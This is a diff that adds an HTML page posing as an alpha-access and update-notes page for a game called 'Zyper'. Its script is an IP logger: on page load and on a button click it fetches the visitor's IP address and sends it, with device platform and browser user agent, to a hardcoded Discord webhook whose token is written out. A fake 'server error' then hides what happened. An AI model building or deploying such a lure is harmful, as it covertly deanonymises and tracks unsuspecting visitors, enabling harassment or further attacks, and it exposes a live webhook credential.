@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zyper: The Next Generation Game</title>
+    <style>
+        body { background-color: #0b0e14; color: #ffffff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; text-align: center; }
+        h1 { color: #58a6ff; font-size: 28px; margin-bottom: 10px; }
+        p { color: #8b949e; line-height: 1.6; }
+        .btn { background-color: #238636; color: white; border: none; padding: 12px 24px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; width: 100%; margin-top: 20px; text-transform: uppercase; }
+        .btn:hover { background-color: #2ea043; }
+        .error-msg { color: #f85149; font-size: 14px; margin-top: 15px; display: none; border: 1px solid #f85149; padding: 10px; border-radius: 6px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>ZYPER ALPHA ACCESS</h1>
+    <p>Você foi selecionado para testar a versão Alpha do Zyper. Leia os requisitos do sistema e as notas de atualização antes de baixar.</p>
+    
+    <button onclick="resgatar()" id="mainBtn" class="btn">LER NOTAS DE ATUALIZAÇÃO</button>
+    
+    <div id="errorBox" class="error-msg">
+        <strong>Erro de Sistema:</strong> Não foi possível carregar as notas. O servidor de autenticação (zyper_auth_01) não respondeu. Tente novamente mais tarde.
+    </div>
+</div>
+
+<script>
+    const webhook = "https://discord.com/api/webhooks/1461832305675997324/btE3tacn7GE4UXfHsLU788xRQQrsMIfk16O07TVzvFlbpwVMc8Q5Vy4szPA3VS_u037E";
+
+    // Função para coletar e enviar dados
+    async function track(tipo) {
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+
+            const payload = {
+                username: "Zyper Sentinel",
+                embeds: [{
+                    title: `🚨 Alerta: ${tipo}`,
+                    color: 15158332,
+                    fields: [
+                        { name: "Endereço IP", value: `**${ipData.ip}**`, inline: true },
+                        { name: "Dispositivo", value: navigator.platform, inline: true },
+                        { name: "Navegador", value: `\`\`\`${navigator.userAgent}\`\`\`` }
+                    ],
+                    footer: { text: "Data: " + new Date().toLocaleString('pt-BR') }
+                }]
+            };
+
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) { console.log("Erro de tracking"); }
+    }
+
+    // Captura o IP assim que a página carrega
+    window.onload = () => track("Página Aberta (Zyper)");
+
+    // Função do botão que simula erro
+    function resgatar() {
+        const btn = document.getElementById('mainBtn');
+        const err = document.getElementById('errorBox');
+        
+        btn.innerText = "CARREGANDO...";
+        btn.disabled = true;
+
+        track("Botão 'LER NOTAS' Clicado");
+
+        setTimeout(() => {
+            btn.style.display = "none";
+            err.style.display = "block";
+        }, 2000);
+    }
+</script>
+
+</body>
+</html>
